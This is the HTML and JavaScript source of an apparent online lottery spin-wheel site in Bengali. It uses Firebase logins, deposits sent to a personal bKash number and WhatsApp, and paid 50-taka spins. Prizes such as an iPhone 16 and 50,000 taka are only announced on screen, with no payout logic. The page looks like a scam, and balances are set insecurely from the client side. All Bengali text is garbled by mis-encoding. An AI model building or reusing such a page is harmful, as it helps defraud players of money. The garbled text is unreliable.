<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Good Luck Lottery | Mobarak Ali</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        body { background: #0a0e14; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 10px; }
        .container { max-width: 450px; margin: auto; background: #111; padding: 20px; border-radius: 15px; border: 2px solid #333; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        input { width: 85%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: #fff; font-size: 16px; }
        button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-primary { background: #ffcc00; color: #000; }
        .btn-deposit { background: #25D366; color: #fff; }
        
        /* Roulette Wheel */
        .wheel-container { position: relative; width: 300px; height: 300px; margin: 30px auto; }
        .wheel-box { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #fff; position: relative; overflow: hidden; transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1); transform: rotate(0deg); background: #222; }
        .slice { position: absolute; width: 100%; height: 100%; clip-path: polygon(50% 50%, 100% 20%, 100% 80%); display: flex; align-items: center; justify-content: flex-end; padding-right: 25px; box-sizing: border-box; font-weight: bold; font-size: 12px; color: #000; }
        .s1 { background: #ff4d4d; transform: rotate(0deg); }
        .s2 { background: #ffcc00; transform: rotate(-60deg); }
        .s3 { background: #39ff14; transform: rotate(-120deg); }
        .s4 { background: #00d2ff; transform: rotate(-180deg); }
        .s5 { background: #ff00ff; transform: rotate(-240deg); }
        .s6 { background: #ffffff; transform: rotate(-300deg); }
        .pointer { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 35px solid #ff0000; z-index: 10; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="color:#ffcc00">Good Luck Lottery üé∞</h2>

    <div id="authBox">
        <p>‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡ßü‡ßá ‡¶≤‡¶ó‡¶á‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        <input type="number" id="phone" placeholder="‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞">
        <input type="password" id="password" placeholder="‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° (‡ß¨ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü)">
        <button class="btn-primary" onclick="handleAuth()">‡¶≤‡¶ó‡¶á‡¶® / ‡¶∏‡¶æ‡¶á‡¶®-‡¶Ü‡¶™</button>
        <p id="authError" style="color:#ff4d4d; font-size:13px;"></p>
    </div>

    <div id="gameBox" style="display:none;">
        <p>‡¶Ü‡¶á‡¶°‡¶ø: <span id="displayId" style="color:#ffcc00"></span></p>
        <p>‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏: <span id="userBalance" style="color:#39ff14; font-weight:bold;">‡ß¶</span> ‡¶ü‡¶æ‡¶ï‡¶æ</p>
        
        <div style="background:#222; padding:15px; border-radius:10px; border: 1px solid #444;">
            <p style="font-size:13px; margin:0 0 10px 0;">‡¶¨‡¶ø‡¶ï‡¶æ‡¶∂ (Personal): <b>01334475903</b></p>
            <input type="number" id="depAmount" placeholder="‡¶ü‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶™‡¶∞‡¶ø‡¶Æ‡¶æ‡¶£">
            <input type="text" id="trxId" placeholder="Transaction ID (TrxID)">
            <button class="btn-deposit" onclick="submitDeposit()">‡¶°‡¶ø‡¶™‡ßã‡¶ú‡¶ø‡¶ü ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü</button>
        </div>

        <div class="wheel-container">
            <div class="pointer"></div>
            <div class="wheel-box" id="wheel">
                <div class="slice s1">‡¶Ü‡¶á‡¶´‡ßã‡¶® ‡ßß‡ß¨</div>
                <div class="slice s2">‡ß´‡ß¶,‡ß¶‡ß¶‡ß¶‡ß≥</div>
                <div class="slice s3">‡¶¨‡¶æ‡¶á‡¶ï</div>
                <div class="slice s4">‡¶≤‡ßç‡¶Ø‡¶æ‡¶™‡¶ü‡¶™</div>
                <div class="slice s5">‡ß®‡ß©,‡ß©‡ß™‡ß´‡ß≥</div>
                <div class="slice s6">‡¶∏‡ßç‡¶Æ‡¶æ‡¶∞‡ßç‡¶ü ‡¶ü‡¶ø‡¶≠‡¶ø</div>
            </div>
        </div>
        
        <button class="btn-primary" id="spinBtn" onclick="playGame()">‡¶∏‡ßç‡¶™‡¶ø‡¶® ‡¶ï‡¶∞‡ßÅ‡¶® (‡ß´‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ)</button>
        <p id="status" style="font-weight:bold; color:#ffcc00; height: 20px;"></p>
    </div>
</div>

<script>
    // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡¶∂‡¶ü ‡¶•‡ßá‡¶ï‡ßá ‡¶®‡ßá‡¶ì‡ßü‡¶æ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó
    const firebaseConfig = {
        apiKey: "AIzaSyD75_camGwn_bF9Xh0rkDfK2ZE_vyyJ3DA",
        authDomain: "good-luck-lottery.firebaseapp.com",
        databaseURL: "https://good-luck-lottery-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "good-luck-lottery",
        storageBucket: "good-luck-lottery.firebasestorage.app",
        messagingSenderId: "842901691566",
        appId: "1:842901691566:web:a1ea87568c2537767ce13f"
    };

    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();

    // Auth Logic
    function handleAuth() {
        const phone = document.getElementById('phone').value;
        const pass = document.getElementById('password').value;
        const err = document.getElementById('authError');
        if(phone.length < 11 || pass.length < 6) {
            err.innerText = "‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ì ‡¶Ö‡¶®‡ßç‡¶§‡¶§ ‡ß¨ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡ßá‡¶∞ ‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° ‡¶¶‡¶ø‡¶®‡•§";
            return;
        }
        const email = phone + "@lottery.com";
        err.innerText = "‡¶≤‡ßã‡¶°‡¶ø‡¶Ç...";

        auth.signInWithEmailAndPassword(email, pass).catch(() => {
            auth.createUserWithEmailAndPassword(email, pass).then(u => {
                db.ref('users/' + u.user.uid).set({ phone: phone, balance: 0 });
            }).catch(e => { err.innerText = "‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá, ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§"; });
        });
    }

    auth.onAuthStateChanged(user => {
        if (user) {
            document.getElementById('authBox').style.display = 'none';
            document.getElementById('gameBox').style.display = 'block';
            document.getElementById('displayId').innerText = user.email.split('@')[0];
            db.ref('users/' + user.uid + '/balance').on('value', snap => {
                document.getElementById('userBalance').innerText = snap.val() || 0;
            });
        }
    });

    // Deposit Logic
    function submitDeposit() {
        const amt = document.getElementById('depAmount').value;
        const trx = document.getElementById('trxId').value;
        if(!amt || !trx) return alert("‡¶∏‡¶¨ ‡¶§‡¶•‡ßç‡¶Ø ‡¶¶‡¶ø‡¶®");
        const msg = `‡¶°‡¶ø‡¶™‡ßã‡¶ú‡¶ø‡¶ü ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü:\n‡¶Ü‡¶á‡¶°‡¶ø: ${document.getElementById('displayId').innerText}\n‡¶ü‡¶æ‡¶ï‡¶æ: ${amt}\nTrxID: ${trx}`;
        window.open(`https://wa.me/8801334475903?text=${encodeURIComponent(msg)}`);
    }

    // Game Logic
    let rotation = 0;
    const prizes = ["‡¶Ü‡¶á‡¶´‡ßã‡¶® ‡ßß‡ß¨", "‡ß´‡ß¶,‡ß¶‡ß¶‡ß¶‡ß≥", "‡¶¨‡¶æ‡¶á‡¶ï", "‡¶≤‡ßç‡¶Ø‡¶æ‡¶™‡¶ü‡¶™", "‡ß®‡ß©,‡ß©‡ß™‡ß´‡ß≥", "‡¶∏‡ßç‡¶Æ‡¶æ‡¶∞‡ßç‡¶ü ‡¶ü‡¶ø‡¶≠‡¶ø"];

    function playGame() {
        const spinBtn = document.getElementById('spinBtn');
        const balRef = db.ref('users/' + auth.currentUser.uid + '/balance');
        
        balRef.once('value').then(snap => {
            let bal = snap.val() || 0;
            if(bal < 50) return alert("‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏ ‡¶®‡ßá‡¶á, ‡¶°‡¶ø‡¶™‡ßã‡¶ú‡¶ø‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®‡•§");

            spinBtn.disabled = true;
            balRef.set(bal - 50);
            
            const extraDeg = Math.floor(Math.random() * 360);
            rotation += 1800 + extraDeg;
            document.getElementById('wheel').style.transform = `rotate(${rotation}deg)`;
            document.getElementById('status').innerText = "‡¶ö‡¶æ‡¶ï‡¶æ ‡¶ò‡ßÅ‡¶∞‡¶õ‡ßá...";

            setTimeout(() => {
                spinBtn.disabled = false;
                const actualDeg = rotation % 360;
                const index = Math.floor(actualDeg / 60);
                document.getElementById('status').innerText = "‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶®! ‡¶Ü‡¶™‡¶®‡¶ø ‡¶ú‡¶ø‡¶§‡ßá‡¶õ‡ßá‡¶®: " + prizes[index];
            }, 5000);
        });
    }
</script>

</body>
</html>
